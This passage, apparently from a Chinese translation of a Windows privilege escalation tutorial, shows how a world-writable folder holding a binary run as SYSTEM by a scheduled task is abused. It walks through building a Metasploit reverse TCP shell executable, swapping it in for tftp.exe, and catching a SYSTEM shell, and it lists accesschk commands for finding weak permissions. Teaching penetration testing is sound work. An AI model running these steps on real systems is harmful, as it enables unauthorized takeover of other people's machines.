<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; accesschk.exe -dqv &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line">E:\GrabLogs</span><br><span class="line">  Medium Mandatory Level (Default) [No-Write-Up]</span><br><span class="line">  RW BUILTIN\Administrators</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\SYSTEM</span><br><span class="line">        FILE_ALL_ACCESS</span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        FILE_ADD_FILE</span><br><span class="line">        FILE_ADD_SUBDIRECTORY</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        FILE_WRITE_ATTRIBUTES</span><br><span class="line">        FILE_WRITE_EA</span><br><span class="line">        DELETE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  R  BUILTIN\Users</span><br><span class="line">        FILE_LIST_DIRECTORY</span><br><span class="line">        FILE_READ_ATTRIBUTES</span><br><span class="line">        FILE_READ_EA</span><br><span class="line">        FILE_TRAVERSE</span><br><span class="line">        SYNCHRONIZE</span><br><span class="line">        READ_CONTROL</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; dir &quot;E:\GrabLogs&quot;</span><br><span class="line"></span><br><span class="line"> Volume in drive E is More</span><br><span class="line"> Volume Serial Number is FD53-2F00</span><br><span class="line"></span><br><span class="line"> Directory of E:\GrabLogs</span><br><span class="line"></span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          .</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/18/2014  11:34 PM    &lt;DIR&gt;          Logs</span><br><span class="line">02/18/2014  09:21 PM           180,736 tftp.exe</span><br><span class="line">               1 File(s)        180,736 bytes</span><br><span class="line">               3 Dir(s)   5,454,602,240 bytes free</span><br></pre></td></tr></table></figure>
<p>显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&apos;127.0.0.1&apos; lport=&apos;9988&apos; O</span><br><span class="line"></span><br><span class="line">       Name: Windows Command Shell, Reverse TCP Inline</span><br><span class="line">     Module: payload/windows/shell_reverse_tcp</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: x86</span><br><span class="line">Needs Admin: No</span><br><span class="line"> Total size: 314</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  vlad902 &lt;vlad902@gmail.com&gt;</span><br><span class="line">  sf &lt;stephen_fewer@harmonysecurity.com&gt;</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">Name      Current Setting  Required  Description</span><br><span class="line">----      ---------------  --------  -----------</span><br><span class="line">EXITFUNC  process          yes       Exit technique: seh, thread, process, none</span><br><span class="line">LHOST     127.0.0.1        yes       The listen address</span><br><span class="line">LPORT     9988             yes       The listen port</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  Connect back to attacker and spawn a command shell</span><br><span class="line"></span><br><span class="line">root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=&apos;127.0.0.1&apos; lport=&apos;9988&apos; R | msfencode -t</span><br><span class="line">exe &gt; /root/Desktop/evil-tftp.exe</span><br><span class="line"></span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 341 (iteration=1)</span><br></pre></td></tr></table></figure>
<p>现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\ GrabLogs \ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\user1\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 948D-A98F</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\user1\Desktop</span><br><span class="line"></span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2014  01:36 AM    &lt;DIR&gt;          ..</span><br><span class="line">04/22/2013  09:39 AM           331,888 accesschk.exe</span><br><span class="line">02/19/2014  01:31 AM            73,802 evil-tftp.exe</span><br><span class="line">01/25/2014  12:46 AM            36,864 fubar.exe</span><br><span class="line">01/22/2014  08:17 AM    &lt;DIR&gt;          incognito2</span><br><span class="line">06/30/2011  01:52 PM         1,667,584 ncat.exe</span><br><span class="line">02/18/2014  12:38 PM            14,336 wlbsctrl.dll</span><br><span class="line">11/22/2013  07:39 PM             1,225 wmic_info.bat</span><br><span class="line">               6 File(s)      2,125,699 bytes</span><br><span class="line">               3 Dir(s)      75,341,824 bytes free</span><br><span class="line">		</span><br><span class="line">C:\Users\user1\Desktop&gt; copy evil-tftp.exe E:\GrabLogs\tftp.exe</span><br><span class="line"></span><br><span class="line">Overwrite E:\GrabLogs\tftp.exe? (Yes/No/All): Yes</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>
<p>为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。</p>
<p><img src="http://www.fuzzysecurity.com/tutorials/images/priv04_big.png" alt="img"></p>
<p>Schtasks Shell (LogGrabberTFTP)</p>
<p>  这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。</p>
<p>我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># When executing any of the sysinternals tools for the first time the user will be presented with a GUI</span><br><span class="line">pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag</span><br><span class="line">to automatically accept the EULA.</span><br><span class="line"></span><br><span class="line">accesschk.exe /accepteula ... ... ...</span><br><span class="line"></span><br><span class="line"># Find all weak folder permissions per drive.</span><br><span class="line">accesschk.exe -uwdqs Users c:\</span><br><span class="line">accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br><span class="line"></span><br><span class="line"># Find all weak file permissions per drive.</span><br><span class="line">accesschk.exe -uwqs Users c:\*.*</span><br><span class="line">accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*</span><br></pre></td></tr></table></figure>
<h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>  本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。</p>
<p>另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。</p>
<p>现在出去弹出SYSTEM !!  </p>

          </div>
          <br><br>
              
                <div class="license-wrapper">
                    <p>原文作者：<a href="">Misaki</a>
                    <p>原文链接：<a href="/2019/03/Windows权限提升基础/">/2019/03/Windows权限提升基础/</a>
                    <p>发表日期：<a href="/2019/03/Windows权限提升基础/">March 18th 2019, 1:29:26 pm</a>
                    <p>更新日期：<a href="/2019/03/Windows权限提升基础/">March 18th 2019, 2:09:23 pm</a>
                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                </div>
              
          <br><br>
          <div>
              <p>
                       
                      <span class="badge badge-default">#&nbsp;渗透测试</span>
                      &nbsp;
                      
              </p>
          </div>
        </div>
      </div>  
    </div>
  </div>
  <!-- TOC -->
  
      <div class="">
        <div id="toc">
          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
          <div id="tocbot"></div>
        </div>
      </div>
  
</div>


<!-- Comments -->
<div class="row">
    <div class="col-md-8 offset-md-2">
    
        
            <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>               
        var disqus_shortname = '';
        var disqus_config = function () {
            this.page.url = '/2019/03/Windows权限提升基础/'; 
            this.page.identifier = '/2019/03/Windows权限提升基础/';
        };
        (function() { 
            var d = document, s = d.createElement('script');
            s.type = 'text/javascript';
            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
</div>
        
    
    </div>
</div>
  

<footer class="footer footer-default">
        <div class="container">
          <div class="float-left" style="padding: 15px 0;">
              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
          </div>
          <div align="right" style="padding: 15px 0;">
              <i class="iconfont icon-love" ></i>
              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
          </div>
        </div>
</footer>
      <!--   Core JS Files   -->
      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
      <script src="/js/main.js"></script>
      <script src="/js/core/popper.min.js"></script>
      <script src="/js/core/bootstrap-material-design.min.js"></script>
      <script src="/js/plugins/moment.min.js"></script>
      <script src="/js/material-kit.min.js?v=2.0.5"></script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
        <script src="/js/post.js"></script>
        <script src="/js/plugins/prettify.js"></script>
        <script>
            $(document).ready(function(){
                $('pre').addClass('prettyprint linenums');
                prettyPrint();
            })
        </script>
      
<script src="/live2d-widget/autoload.js"></script>
</body>
</html>